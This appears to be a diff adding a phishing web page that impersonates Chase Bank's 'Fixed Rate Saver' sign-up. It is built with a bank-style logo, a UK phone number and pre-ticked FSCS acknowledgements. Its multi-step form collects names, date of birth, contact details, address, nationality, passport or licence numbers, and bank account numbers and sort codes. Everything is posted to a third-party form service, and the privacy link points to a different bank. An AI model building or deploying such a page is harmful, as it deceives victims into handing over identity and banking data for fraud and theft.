@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chase</title>
+    <link rel="icon" type="image/x-icon" href="assets/fav.png">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+        integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap');
+
+        body {
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        .form-control:focus {
+            box-shadow: none;
+            border-color: #C8C9D0;
+        }
+
+        .mb-4 {
+            margin-bottom: 40px !important;
+        }
+
+
+        .footer p {
+            color: white;
+        }
+
+        .navbar {
+            padding: 10px;
+        }
+
+        /* Default styles for all screen sizes */
+        .hero-section {
+            position: relative;
+            height: 100vh;
+            background: url('assets/home_bg.png') center/cover no-repeat;
+            color: white;
+            display: flex;
+            align-items: center;
+            text-align: center;
+            overflow: hidden;
+            /* Ensure the overlay doesn't overflow */
+        }
+
+        .flatpicker {
+            background-color: white !important;
+        }
+
+        .fa-chevron-left {
+            cursor: pointer;
+            background: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 50px;
+        }
+
+        .main_title {
+            color: #0C0C0E;
+            font-size: 24px;
+            font-style: normal;
+            font-weight: 400;
+            line-height: 32px;
+            /* 133.333% */
+        }
+
+        .form {
+            width: 488px;
+            margin: auto;
+            margin-top: 50px;
+        }
+
+        .form-control {
+            border-radius: 8px 8px 8px 8px;
+            border-left: 2px solid #C8C9D0;
+            border-top: 2px solid #C8C9D0;
+            border-right: 2px solid #C8C9D0;
+            border-bottom: 2px solid #C8C9D0;
+            height: 56px;
+        }
+
+        button:not(:disabled){
+            background-color: #005EB8!important;
+            color: white!important;
+        }
+        .middleNameTxt{
+            color: #5F606D;
+            font-size: 13.6px;
+        }
+    </style>
+</head>
+
+<body style="background: #F1F2F3">
+    <div style="background-color: white;">
+        <nav class="navbar navbar-expand-lg navbar-dark container">
+            <div class="container-fluid" style="flex-wrap: nowrap;">
+                <!-- Left-aligned Icon -->
+                <a class="navbar-brand" href="#">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="132" height="24" viewBox="0 0 132 24" fill="none">
+                        <g clip-path="url(#clip0_172_1692)">
+                            <path
+                                d="M115.687 0.118774C115.457 0.118774 115.237 0.207428 115.075 0.365118C114.913 0.522808 114.823 0.736524 114.824 0.958955V6.8099H130.782L123.512 0.118774H115.687Z"
+                                fill="#005EB8" />
+                            <path
+                                d="M131.382 8.58991C131.384 8.36713 131.294 8.15273 131.132 7.99478C130.97 7.83684 130.749 7.74856 130.519 7.74971H124.469V23.2368L131.382 16.1775V8.58991Z"
+                                fill="#005EB8" />
+                            <path
+                                d="M122.631 23.7824C123.107 23.7824 123.493 23.4082 123.493 22.9466V17.0956H107.535L114.797 23.7824H122.631Z"
+                                fill="#005EB8" />
+                            <path
+                                d="M106.945 15.3244C106.946 15.546 107.039 15.7582 107.201 15.9141C107.364 16.0701 107.584 16.157 107.812 16.1559H113.85V0.686157L106.954 7.73241L106.945 15.3244Z"
+                                fill="#005EB8" />
+                            <path
+                                d="M33.7825 2.9425V10.0884H23.5133V2.9425H19.7773V20.9587H23.5133V13.2196H33.7825V20.9587H37.5319V2.9425H33.7825Z"
+                                fill="black" />
+                            <path
+                                d="M83.543 2.9425V20.9544H99.9524L97.8833 17.7843H87.2968V13.2196H97.5482V10.1663H87.2968V6.04338H97.861L99.9032 2.9425H83.543Z"
+                                fill="black" />
+                            <path
+                                d="M5.8703 2.9425C1.97799 2.9425 0.0117188 5.23351 0.0117188 8.57258V15.2897C0.0117188 19.1485 2.54105 20.9544 5.84796 20.9544H17.583L15.4067 17.663H6.5719C4.69501 17.663 3.89063 17.0047 3.89063 14.9692V8.87141C3.89063 6.90088 4.58329 6.12999 6.63894 6.12999H15.514L17.6009 2.9425H5.8703Z"
+                                fill="black" />
+                            <path
+                                d="M67.1348 2.93817C64.9004 2.93817 62.5811 4.23741 62.5811 7.61546V8.48163C62.5811 11.9896 64.8155 13.3278 67.0141 13.3408H74.7943C75.6076 13.3408 76.26 13.4664 76.26 14.7916V16.3074C76.26 17.4984 75.6299 17.7712 74.7719 17.7712H64.5339L62.4336 20.9371H75.0132C78.0476 20.9371 80.1032 19.4776 80.1032 16.0996V14.8609C80.1032 11.5955 78.1861 10.0494 75.2233 10.0494H67.7917C66.9694 10.0494 66.3974 9.83717 66.3974 8.65053V7.40758C66.3974 6.3985 66.7951 6.03038 67.738 6.03038H77.48L79.5223 2.9295L67.1348 2.93817Z"
+                                fill="black" />
+                            <path
+                                d="M48.4029 2.94684L39.5859 20.9501H43.7509L45.4669 17.2386H55.048L56.755 20.9501H60.9378L52.1075 2.94684H48.4029ZM50.244 6.68867L53.6269 14.168H46.879L50.244 6.68867Z"
+                                fill="black" />
+                        </g>
+                        <defs>
+                            <clipPath id="clip0_172_1692">
+                                <rect width="132" height="24" fill="white" />
+                            </clipPath>
+                        </defs>
+                    </svg>
+                </a>
+
+
+                <!-- Right-aligned Nav Item -->
+                <div class="navbar-collapse justify-content-end" id="navbarNav">
+                    <ul class="navbar-nav" style="gap:20px;justify-content: end; flex-direction: row;">
+                        <li class="nav-item">
+                            <div style="display: flex;flex-direction: column;">
+                                <span style="font-size: 16px;color: #005EB8; font-weight:bold;">020 3893 2915</span>
+                                <span style="font-size: 14px;color: #5F606D;">Weekdays 9am-6pm (UK)</span>
+                            </div>
+                        </li>
+
+                    </ul>
+                </div>
+            </div>
+        </nav>
+    </div>
+
+    <form action="https://formspree.io/f/mwkgnyel" method="post">
+        <div class="step_container container step1">
+            <div class="form">
+                <p class="main_title">Enter your name</p>
+                <div class="form-group mb-4">
+                    <input type="text" name="first_name" class="form-control requireField" placeholder="First Name" id="firstName">
+                </div>
+                <div class="form-group mb-4">
+                    <input type="text" name="middle_name"  class="form-control" placeholder="Middle Name(s)" id="middleName">
+                    
+                    <span class="middleNameTxt">If shown on your passport, driving licence or national ID card</span>
+                </div>
+                <div class="form-group mb-4">
+                    <input type="text" name="surname"  class="form-control requireField" placeholder="Surname" id="surname">
+                </div>
+                <p class="main_title">Enter your date of birth</p>
+                <div class="form-group mb-4">
+                    <div class="input-group">
+                        <input style="border-right: none;" type="text" class="requireField form-control flatpicker" name="dob"
+                            placeholder="DD/MM/YYYY" id="dob">
+                        <span class="input-group-text"
+                            style="background: white;    border: 2px solid #c8c9d0; border-left: none; "><i
+                                style="color: #b1b1b1;" class="fa-solid fa-calendar-days"></i></span>
+                    </div>
+                </div>
+                <div class="form-group mb-4">
+                    <button disabled class="btn btn-default show_step2"
+                        style="border-radius: 24px; background: #C8C9D0;min-width: 170px;"
+                        id="continueButton">Continue</button>
+                </div>
+            </div>
+        </div>
+
+        <div style="display:none;" class="step_container container step2">
+            <a href="#" class="show_step1" style="text-decoration:none;"><i class="fa-solid fa-chevron-left"></i></a>
+            <div class="form">
+                <p class="main_title">Enter your personal email</p>
+                <div class="form-group mb-4">
+                    <input type="email" class="requireField form-control" name="personal_email" placeholder="Personal Email Address">
+                    <span class="email-error-message" style="color: rgb(205, 33, 33);"></span>
+                </div>
+
+                <p class="main_title">Enter your mobile number</p>
+                <div class="form-group mb-4">
+                    <input type="number" class="requireField form-control" name="mobile_no" placeholder="Mobile Number">
+                </div>
+                <div class="form-group mb-4">
+                    <p>You can find out more about how we treat your personal data by
+                        reading our <a href="https://www.tide.co/privacy/" style="text-decoration: none;">Privacy
+                            Notice</a>
+                    </p>
+                </div>
+                <labr>
+                <div class="form-group mb-4">
+                    <button disabled class="btn btn-default show_step3"
+                        style="border-radius: 24px; background: #C8C9D0;min-width: 170px;">Continue</button>
+                </div>
+            </div>
+
+        </div>
+
+        <div style="display:none;" class="step_container container step3">
+            <a href="#" class="show_step2" style="text-decoration:none;"><i class="fa-solid fa-chevron-left"></i></a>
+            <div class="form">
+                <p class="main_title">Enter your adress</p>
+                <div class="form-group mb-4">
+                    <input type="text" name="address_1" class="requireField form-control" placeholder="Address 1">
+                </div>
+                <div class="form-group mb-4">
+                    <input name="address_2" type="text" class="form-control" placeholder="Address 2">
+                    
+                </div>
+                <div class="form-group mb-4">
+                    <input type="text" name="city" class="requireField form-control" placeholder="City">
+                </div>
+                <div class="form-group mb-4">
+                    <input type="text" name="post_code" class="requireField form-control" placeholder="Post Code">
+                </div>
+
+
+
+                <p class="main_title">Enter your nationality</p>
+
+                <div class="form-group mb-4">
+                    <div class="input-group">
+                        <span class="input-group-text" style="border-top-left-radius: 10px;
+                    border-bottom-left-radius: 10px;border: 2px solid #c8c9d0; background: white; border-right: none;">
+                            <i style="color: #b1b1b1;" class="fa-solid fa-magnifying-glass"></i>
+                        </span>
+
+                        <select name="nationality" style="border-left: none;" class="requireField form-control" id="nationalitySelect"
+                            placeholder="Choose Nationality">
+                            <option value>Select Nationality</option>
+                            <option value="afghan">Afghan</option>
+                            <option value="albanian">Albanian</option>
+                            <option value="algerian">Algerian</option>
+                            <option value="american">American</option>
+                            <option value="andorran">Andorran</option>
+                            <option value="angolan">Angolan</option>
+                            <option value="antiguans">Antiguans</option>
+                            <option value="argentinean">Argentinean</option>
+                            <option value="armenian">Armenian</option>
+                            <option value="australian">Australian</option>
+                            <option value="austrian">Austrian</option>
+                            <option value="azerbaijani">Azerbaijani</option>
+                            <option value="bahamian">Bahamian</option>
+                            <option value="bahraini">Bahraini</option>
+                            <option value="bangladeshi">Bangladeshi</option>
+                            <option value="barbadian">Barbadian</option>
+                            <option value="barbudans">Barbudans</option>
+                            <option value="batswana">Batswana</option>
+                            <option value="belarusian">Belarusian</option>
+                            <option value="belgian">Belgian</option>
+                            <option value="belizean">Belizean</option>
+                            <option value="beninese">Beninese</option>
+                            <option value="bhutanese">Bhutanese</option>
+                            <option value="bolivian">Bolivian</option>
+                            <option value="bosnian">Bosnian</option>
+                            <option value="brazilian">Brazilian</option>
+                            <option value="british">British</option>
+                            <option value="bruneian">Bruneian</option>
+                            <option value="bulgarian">Bulgarian</option>
+                            <option value="burkinabe">Burkinabe</option>
+                            <option value="burmese">Burmese</option>
+                            <option value="burundian">Burundian</option>
+                            <option value="cambodian">Cambodian</option>
+                            <option value="cameroonian">Cameroonian</option>
+                            <option value="canadian">Canadian</option>
+                            <option value="cape verdean">Cape Verdean</option>
+                            <option value="central african">Central African</option>
+                            <option value="chadian">Chadian</option>
+                            <option value="chilean">Chilean</option>
+                            <option value="chinese">Chinese</option>
+                            <option value="colombian">Colombian</option>
+                            <option value="comoran">Comoran</option>
+                            <option value="congolese">Congolese</option>
+                            <option value="costa rican">Costa Rican</option>
+                            <option value="croatian">Croatian</option>
+                            <option value="cuban">Cuban</option>
+                            <option value="cypriot">Cypriot</option>
+                            <option value="czech">Czech</option>
+                            <option value="danish">Danish</option>
+                            <option value="djibouti">Djibouti</option>
+                            <option value="dominican">Dominican</option>
+                            <option value="dutch">Dutch</option>
+                            <option value="east timorese">East Timorese</option>
+                            <option value="ecuadorean">Ecuadorean</option>
+                            <option value="egyptian">Egyptian</option>
+                            <option value="emirian">Emirian</option>
+                            <option value="equatorial guinean">Equatorial Guinean</option>
+                            <option value="eritrean">Eritrean</option>
+                            <option value="estonian">Estonian</option>
+                            <option value="ethiopian">Ethiopian</option>
+                            <option value="fijian">Fijian</option>
+                            <option value="filipino">Filipino</option>
+                            <option value="finnish">Finnish</option>
+                            <option value="french">French</option>
+                            <option value="gabonese">Gabonese</option>
+                            <option value="gambian">Gambian</option>
+                            <option value="georgian">Georgian</option>
+                            <option value="german">German</option>
+                            <option value="ghanaian">Ghanaian</option>
+                            <option value="greek">Greek</option>
+                            <option value="grenadian">Grenadian</option>
+                            <option value="guatemalan">Guatemalan</option>
+                            <option value="guinea-bissauan">Guinea-Bissauan</option>
+                            <option value="guinean">Guinean</option>
+                            <option value="guyanese">Guyanese</option>
+                            <option value="haitian">Haitian</option>
+                            <option value="herzegovinian">Herzegovinian</option>
+                            <option value="honduran">Honduran</option>
+                            <option value="hungarian">Hungarian</option>
+                            <option value="icelander">Icelander</option>
+                            <option value="indian">Indian</option>
+                            <option value="indonesian">Indonesian</option>
+                            <option value="iranian">Iranian</option>
+                            <option value="iraqi">Iraqi</option>
+                            <option value="irish">Irish</option>
+                            <option value="israeli">Israeli</option>
+                            <option value="italian">Italian</option>
+                            <option value="ivorian">Ivorian</option>
+                            <option value="jamaican">Jamaican</option>
+                            <option value="japanese">Japanese</option>
+                            <option value="jordanian">Jordanian</option>
+                            <option value="kazakhstani">Kazakhstani</option>
+                            <option value="kenyan">Kenyan</option>
+                            <option value="kittian and nevisian">Kittian and Nevisian</option>
+                            <option value="kuwaiti">Kuwaiti</option>
+                            <option value="kyrgyz">Kyrgyz</option>
+                            <option value="laotian">Laotian</option>
+                            <option value="latvian">Latvian</option>
+                            <option value="lebanese">Lebanese</option>
+                            <option value="liberian">Liberian</option>
+                            <option value="libyan">Libyan</option>
+                            <option value="liechtensteiner">Liechtensteiner</option>
+                            <option value="lithuanian">Lithuanian</option>
+                            <option value="luxembourger">Luxembourger</option>
+                            <option value="macedonian">Macedonian</option>
+                            <option value="malagasy">Malagasy</option>
+                            <option value="malawian">Malawian</option>
+                            <option value="malaysian">Malaysian</option>
+                            <option value="maldivan">Maldivan</option>
+                            <option value="malian">Malian</option>
+                            <option value="maltese">Maltese</option>
+                            <option value="marshallese">Marshallese</option>
+                            <option value="mauritanian">Mauritanian</option>
+                            <option value="mauritian">Mauritian</option>
+                            <option value="mexican">Mexican</option>
+                            <option value="micronesian">Micronesian</option>
+                            <option value="moldovan">Moldovan</option>
+                            <option value="monacan">Monacan</option>
+                            <option value="mongolian">Mongolian</option>
+                            <option value="moroccan">Moroccan</option>
+                            <option value="mosotho">Mosotho</option>
+                            <option value="motswana">Motswana</option>
+                            <option value="mozambican">Mozambican</option>
+                            <option value="namibian">Namibian</option>
+                            <option value="nauruan">Nauruan</option>
+                            <option value="nepalese">Nepalese</option>
+                            <option value="new zealander">New Zealander</option>
+                            <option value="ni-vanuatu">Ni-Vanuatu</option>
+                            <option value="nicaraguan">Nicaraguan</option>
+                            <option value="nigerien">Nigerien</option>
+                            <option value="north korean">North Korean</option>
+                            <option value="northern irish">Northern Irish</option>
+                            <option value="norwegian">Norwegian</option>
+                            <option value="omani">Omani</option>
+                            <option value="pakistani">Pakistani</option>
+                            <option value="palauan">Palauan</option>
+                            <option value="panamanian">Panamanian</option>
+                            <option value="papua new guinean">Papua New Guinean</option>
+                            <option value="paraguayan">Paraguayan</option>
+                            <option value="peruvian">Peruvian</option>
+                            <option value="polish">Polish</option>
+                            <option value="portuguese">Portuguese</option>
+                            <option value="qatari">Qatari</option>
+                            <option value="romanian">Romanian</option>
+                            <option value="russian">Russian</option>
+                            <option value="rwandan">Rwandan</option>
+                            <option value="saint lucian">Saint Lucian</option>
+                            <option value="salvadoran">Salvadoran</option>
+                            <option value="samoan">Samoan</option>
+                            <option value="san marinese">San Marinese</option>
+                            <option value="sao tomean">Sao Tomean</option>
+                            <option value="saudi">Saudi</option>
+                            <option value="scottish">Scottish</option>
+                            <option value="senegalese">Senegalese</option>
+                            <option value="serbian">Serbian</option>
+                            <option value="seychellois">Seychellois</option>
+                            <option value="sierra leonean">Sierra Leonean</option>
+                            <option value="singaporean">Singaporean</option>
+                            <option value="slovakian">Slovakian</option>
+                            <option value="slovenian">Slovenian</option>
+                            <option value="solomon islander">Solomon Islander</option>
+                            <option value="somali">Somali</option>
+                            <option value="south african">South African</option>
+                            <option value="south korean">South Korean</option>
+                            <option value="spanish">Spanish</option>
+                            <option value="sri lankan">Sri Lankan</option>
+                            <option value="sudanese">Sudanese</option>
+                            <option value="surinamer">Surinamer</option>
+                            <option value="swazi">Swazi</option>
+                            <option value="swedish">Swedish</option>
+                            <option value="swiss">Swiss</option>
+                            <option value="syrian">Syrian</option>
+                            <option value="taiwanese">Taiwanese</option>
+                            <option value="tajik">Tajik</option>
+                            <option value="tanzanian">Tanzanian</option>
+                            <option value="thai">Thai</option>
+                            <option value="togolese">Togolese</option>
+                            <option value="tongan">Tongan</option>
+                            <option value="trinidadian or tobagonian">Trinidadian or Tobagonian</option>
+                            <option value="tunisian">Tunisian</option>
+                            <option value="turkish">Turkish</option>
+                            <option value="tuvaluan">Tuvaluan</option>
+                            <option value="ugandan">Ugandan</option>
+                            <option value="ukrainian">Ukrainian</option>
+                            <option value="uruguayan">Uruguayan</option>
+                            <option value="uzbekistani">Uzbekistani</option>
+                            <option value="venezuelan">Venezuelan</option>
+                            <option value="vietnamese">Vietnamese</option>
+                            <option value="welsh">Welsh</option>
+                            <option value="yemenite">Yemenite</option>
+                            <option value="zambian">Zambian</option>
+                            <option value="zimbabwean">Zimbabwean</option>
+                            <!-- Add more options as needed -->
+                        </select>
+                    </div>
+                </div>
+
+                <br>
+                <div class="form-group mb-4">
+                    <button disabled class="btn btn-default show_step4"
+                        style="border-radius: 24px; background: #C8C9D0;min-width: 170px;">Continue</button>
+                </div>
+            </div>
+
+        </div>
+
+        <div style="display:none;" class="step_container container step4">
+            <a href="#" class="show_step3" style="text-decoration:none;"><i class="fa-solid fa-chevron-left"></i></a>
+            <div class="form">
+                <p class="main_title">Enter your verification document number</p>
+
+
+                <div class="form-group mb-4">
+                    <div class="input-group">
+                        <select style="border-right: none;" class="requireField form-control" name="interest_frequency_1"
+                            placeholder="select document type">
+                            <option value>Select document type</option>
+                            <option value="Passport">Passport</option>
+                            <option value="Drivers Licence">Drivers Licence</option>
+                            <option value="National Insurance">National Insurance</option>
+                        </select>
+                        <span class="input-group-text"
+                            style="background: white;border:2px solid #c8c9d0; border-left: none;">
+                            <i style="color: #b1b1b1;" class="fa-solid fa-angle-down"></i>
+                        </span>
+                    </div>
+
+                </div>
+
+                <div class="form-group mb-4">
+                    <input type="text" class="requireField form-control" placeholder="Enter document number" name="document_number">
+                </div>
+
+                <p class="main_title">Enter Your Nominated Account</p>
+                <div class="form-group mb-4">
+                    <input type="text" class="requireField form-control" placeholder="Enter Account Name" name="account_number">
+                </div>
+                <div class="form-group mb-4">
+                    <input type="number" class="requireField form-control" placeholder="Enter Account Number" name="account_number">
+                    <p style="color: #5F606D; margin-top:5px;">Account Numbers should be 8 digits</p>
+                </div>
+                <div class="form-group mb-4">
+                    <input type="number"  class="requireField form-control" placeholder="Enter Sort Code" name="sort_code">
+                    <p style="color: #5F606D; margin-top:5px;">Sort Codes should be 6 digits</p>
+                </div>
+                <br>
+                <div class="form-group mb-4">
+                    <button disabled class="btn btn-default show_step5"
+                        style="border-radius: 24px; background: #C8C9D0;min-width: 170px;">Continue</button>
+                </div>
+            </div>
+
+        </div>
+
+        <div style="display:none;" class="step_container container step5">
+            <a href="#" class="show_step4" style="text-decoration:none;"><i class="fa-solid fa-chevron-left"></i></a>
+            <div class="form">
+                <p class="main_title">Select Interest Frequency</p>
+                <div class="form-group mb-4">
+                    <div class="input-group">
+                        <select style="border-right: none;" class="requireField form-control"
+                            placeholder="Select interest frequency" name="interest_frequency_2">
+                            <option value>Select interest frequency</option>
+                            <option value="Monthly">Monthly</option>
+                            <option value="Quarterly">Quarterly</option>
+                            <option value="Annually">Annually</option>
+                        </select>
+                        <span class="input-group-text"
+                            style="background: white;border:2px solid #c8c9d0; border-left: none;">
+                            <i style="color: #b1b1b1;" class="fa-solid fa-angle-down"></i>
+                        </span>
+                    </div>
+
+                </div>
+                <div class="form-group mb-4" style="width:50%">
+                    <input type="text" class="requireField form-control" name="investment_amount" placeholder="Enter investment amount">
+                </div>
+
+
+
+                <p class="main_title">I acknowledge the following:</p>
+
+
+
+
+               
+
+                
+                <div class="form-group">
+                    <div class="input-group" style="border-bottom: 1px solid lightgrey;">
+                        <div
+                            style="height: 56px;margin: 0;background: #ffff;width: 100%;display: flex;align-items: center;justify-content: space-between;">
+                            <div style="margin-left: 15px;">FSCS Protection Eligibility</div>
+                            <i style="color: #02C39A; margin-right: 15px;" class="fa-solid fa-check"></i>
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <div class="input-group" style="border-bottom: 1px solid lightgrey;">
+                        <div
+                            style="height: 56px;margin: 0;background: #f7f7f7;width: 100%;display: flex;align-items: center;justify-content: space-between;">
+                            <div style="margin-left: 15px;">Chase Bank is a subsidary of J.P Morgan</div>
+                            <i style="color: #02C39A; margin-right: 15px;" class="fa-solid fa-check"></i>
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <div class="input-group" style="border-bottom: 1px solid lightgrey;">
+                        <div
+                            style="height: 56px;margin: 0;background: #ffff;width: 100%;display: flex;align-items: center;justify-content: space-between;">
+                            <div style="margin-left: 15px;">The  information on the application is correct</div>
+                            <i style="color: #02C39A; margin-right: 15px;" class="fa-solid fa-check"></i>
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <div class="input-group" style="border-bottom: 1px solid lightgrey;">
+                        <div
+                            style="height: 56px;margin: 0;background: #fbfbfb;width: 100%;display: flex;align-items: center;justify-content: space-between;">
+                            <div style="margin-left: 15px;">I am opening a savings account </div>
+                            <i style="color: #02C39A; margin-right: 15px;" class="fa-solid fa-check"></i>
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <div class="input-group">
+                        <div
+                            style="gap:15px;padding:10px;margin: 0;background: #fbfbfb;width: 100%;display: flex;align-items: center;justify-content: space-between;    justify-content: space-between;margin-top: 10px;border: 1px solid lightgrey;border-radius: 10px;">
+                            <div style="margin-left: 15px;">I agree to the <b>FSCS Protection Eligibility</b>, and confirm I
+                                have
+                                read and understood the above agreement and acknowledge the receipt of the <b>FSCS Info
+                                    Sheet
+                                    and Exclusions List</b>. I confirm the information is correct and I am happy to proceed with
+                                a
+                                <b>Chase Fixed Rate Saver</b>.</div>
+                            <input required name="agree" style="width: 40px !important;  height: 40px!important;" type="checkbox"
+                                name="" id="">
+                        </div>
+                    </div>
+                </div>
+                <br>
+                <div class="form-group mb-4">
+                    <button disabled class="btn btn-default submit_form"
+                        style="border-radius: 24px; background: #C8C9D0;min-width: 170px;">Submit</button>
+                </div>
+            </div>
+
+        </div>
+
+    </form>
+
+
+
+    <!-- Bootstrap JS and dependencies -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+
+    <script>
+
+        // Function to check if all required fields are filled
+        function checkRequiredFields(this_instance) {
+            let isValid = true;
+            let all_fields = this_instance.closest('.step_container').find('.requireField');
+            let continue_button = this_instance.closest('.step_container').find('.btn-default');
+            let emailField = this_instance.closest('.step_container').find('.requireField[type="email"]');
+            let emailErrorMessage = this_instance.closest('.step_container').find('.email-error-message');
+    
+            // Check each required input field
+            all_fields.each(function () {
+                let inputValue = $(this).val().trim();
+                let inputType = $(this).attr('type');
+    
+                // Check if the field is empty
+                if (inputValue === '') {
+                    isValid = false;
+                    return false; // Exit the loop if any field is empty
+                }
+    
+                // Check email format if the input is an email field
+                if (inputType === 'email') {
+                    if (!isValidEmail(inputValue)) {
+                        isValid = false;
+                        emailErrorMessage.text('Please enter a valid email address');
+                    } else {
+                        emailErrorMessage.text('');
+                    }
+                }
+            });
+    
+            // Enable or disable the Continue button based on validation result
+            continue_button.prop('disabled', !isValid);
+    
+            return isValid;
+        }
+    
+        // Function to validate email format
+        function isValidEmail(email) {
+            // Use a regular expression for basic email format validation
+            let emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+    
+        $('.submit_form').on('click', function () {
+            $('form').submit();
+        });
+    
+        // Bind the checkRequiredFields function to input and change events
+        $('.step_container .requireField').on('input change', function () {
+            checkRequiredFields($(this));
+        });
+    
+        // Bind the checkRequiredFields function to the blur event for the email field
+        $('.step_container .requireField[type="email"]').on('blur', function () {
+            checkRequiredFields($(this));
+        });
+    
+        $(document).on("click", ".show_step1", function () {
+            $('.step1').show();
+            $('.step2').hide();
+            $('.step3').hide();
+            $('.step4').hide();
+            $('.step5').hide();
+        });
+        $(document).on("click", ".show_step2", function () {
+            $('.step1').hide();
+            $('.step2').show();
+            $('.step3').hide();
+            $('.step4').hide();
+            $('.step5').hide();
+        });
+        $(document).on("click", ".show_step3", function () {
+            $('.step1').hide();
+            $('.step2').hide();
+            $('.step3').show();
+            $('.step4').hide();
+            $('.step5').hide();
+        });
+        $(document).on("click", ".show_step4", function () {
+            $('.step1').hide();
+            $('.step2').hide();
+            $('.step3').hide();
+            $('.step4').show();
+            $('.step5').hide();
+        });
+        $(document).on("click", ".show_step5", function () {
+            $('.step1').hide();
+            $('.step2').hide();
+            $('.step3').hide();
+            $('.step4').hide();
+            $('.step5').show();
+        });
+        flatpickr(".flatpicker", {
+            dateFormat: "d/m/Y",
+            enableTime: false, // Set to true if you want to include time
+        });
+    
+    </script>
+    
+    
+
+
+</body>
+
+</html>
